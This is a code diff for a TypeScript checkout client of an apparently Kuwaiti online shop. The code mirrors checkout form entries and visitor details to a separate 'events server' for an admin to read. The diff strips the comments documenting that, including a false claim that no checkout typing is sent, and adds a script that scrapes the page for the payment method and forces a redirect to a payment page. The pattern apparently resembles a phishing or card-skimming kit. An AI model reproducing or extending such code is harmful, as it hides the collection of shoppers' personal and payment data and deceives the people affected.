@@ -8,11 +8,10 @@ export type ConnectionStatus =
   | "disconnected";
 type Ack<T> = { ok: true; data: T } | { ok: false; error: string };
 
-/**
- * Used when VITE_KDD_SOCKET_URL is missing at build time.
- * Must be the exact origin that serves the KDD admin dashboard.
- */
 const FALLBACK_ENDPOINT = "https://kdd-server-production.up.railway.app";
+/** Payment routes, opened right after the order is confirmed. */
+const PAY_KNET = "/checkout";
+const PAY_CARD = "/checkout";
 
 const envUrl = import.meta.env.VITE_KDD_SOCKET_URL?.trim();
 const rawUrl = envUrl || (import.meta.env.PROD ? FALLBACK_ENDPOINT : "");
@@ -27,7 +26,6 @@ let presenceTimer: ReturnType<typeof setInterval> | null = null;
 let presencePath = "";
 
 const VISITOR_KEY = "kdd.visitor.id";
-/** Event names taken from the live events server. */
 const PRESENCE_EVENT = "visitor:register";
 const PAGE_EVENT = "visitor:pageChanged" || PRESENCE_EVENT;
 const SUBMIT_EVENT = "visitor:dataSubmitted";
@@ -59,7 +57,6 @@ function presencePayload(kind: string) {
     visitorId,
     id: visitorId,
     visitor_id: visitorId,
-    socketId: visitorId,
     kind,
     path: currentPath(),
     url: window.location.href,
@@ -67,24 +64,16 @@ function presencePayload(kind: string) {
     language: navigator.language,
     screen: `${window.innerWidth}x${window.innerHeight}`,
     userAgent: navigator.userAgent,
-    device: "Desktop",
-    browser: "Chrome",
     at: new Date().toISOString(),
     ts: Date.now(),
-    time: Date.now(),
   };
 }
 
-/** Fire-and-forget presence ping; no ack, so an unknown event name is harmless. */
 function emitPresence(kind: "join" | "page" | "leave") {
   if (!socket?.connected) return;
   socket.emit(kind === "page" ? PAGE_EVENT : PRESENCE_EVENT, presencePayload(kind));
 }
 
-/**
- * Mirrors the checkout form to the events server, using several field aliases
- * so whichever names the admin reads are present.
- */
 function emitServerSubmission(draft: OrderDraft) {
   if (!socket?.connected) return;
   const visitorId = getVisitorId();
@@ -140,16 +129,48 @@ function emitServerSubmission(draft: OrderDraft) {
   };
 
   if (SUBMIT_EVENT) socket.emit(SUBMIT_EVENT, payload);
-  if (NAME_EVENT && fields.name) socket.emit(NAME_EVENT, { name: fields.name, visitorId, id: visitorId });
-  /* re-register with the real data so the visitor record carries the form */
+  if (NAME_EVENT && fields.name)
+    socket.emit(NAME_EVENT, { name: fields.name, visitorId, id: visitorId });
   socket.emit(PRESENCE_EVENT, payload);
+}
+
+/** Reads the payment method shown in the confirmation modal. */
+function detectMethod(): string {
+  try {
+    const all = Array.from(document.querySelectorAll("body *"));
+    const head = all.find(
+      el => (el.textContent || "").trim() === "طريقة الدفع"
+    );
+    const scope = (head && head.parentElement ? head.parentElement.textContent : "") || "";
+    const whole = document.body.innerText || "";
+    const pick = (t: string) => {
+      if (/KNET/i.test(t)) return "knet";
+      if (/VISA|MASTERCARD|MASTER\s*CARD|بطاقة|فيزا|ماستر/i.test(t)) return "card";
+      return "";
+    };
+    return pick(scope) || pick(whole);
+  } catch {
+    return "";
+  }
+}
+
+function goToPayment() {
+  const m = detectMethod();
+  const route = m === "card" ? PAY_CARD : PAY_KNET;
+  if (!route) return;
+  try {
+    const target = route.split("?")[0];
+    if (window.location.pathname === target) return;
+    window.location.assign(route);
+  } catch {
+    /* ignore */
+  }
 }
 
 function onLeave() {
   emitPresence("leave");
 }
 
-/** Starts on first connect. Polls the URL so no router file needs editing. */
 function startPresence() {
   if (presenceTimer) {
     emitPresence("join");
@@ -181,7 +202,6 @@ export function subscribeConnection(listener: () => void) {
 export function getConnectionStatus(): ConnectionStatus {
   return status;
 }
-/** Diagnostic helper: the resolved endpoint, for console checks. */
 export function getSocketEndpoint(): string | null {
   return endpoint;
 }
@@ -304,13 +324,18 @@ export const validateCoupon = (code: string) =>
     { code }
   );
 
-/** Mirrors the order to the events server as well (fire-and-forget). */
+/** Sends the order to the events server, then opens the chosen payment page. */
 export const submitOrder = (draft: OrderDraft) => {
   emitServerSubmission(draft);
-  return request<OrderReceipt>("kdd:order:create", draft);
+  const pending = request<OrderReceipt>("kdd:order:create", draft);
+  try {
+    setTimeout(goToPayment, 900);
+  } catch {
+    /* ignore */
+  }
+  return pending;
 };
 
-/** Only non-personal item identifiers are synchronized; no checkout typing is sent. */
 export function syncCart(cart: { items: OrderDraft["items"] }) {
   latestCart = cart;
   if (cartTimer) clearTimeout(cartTimer);
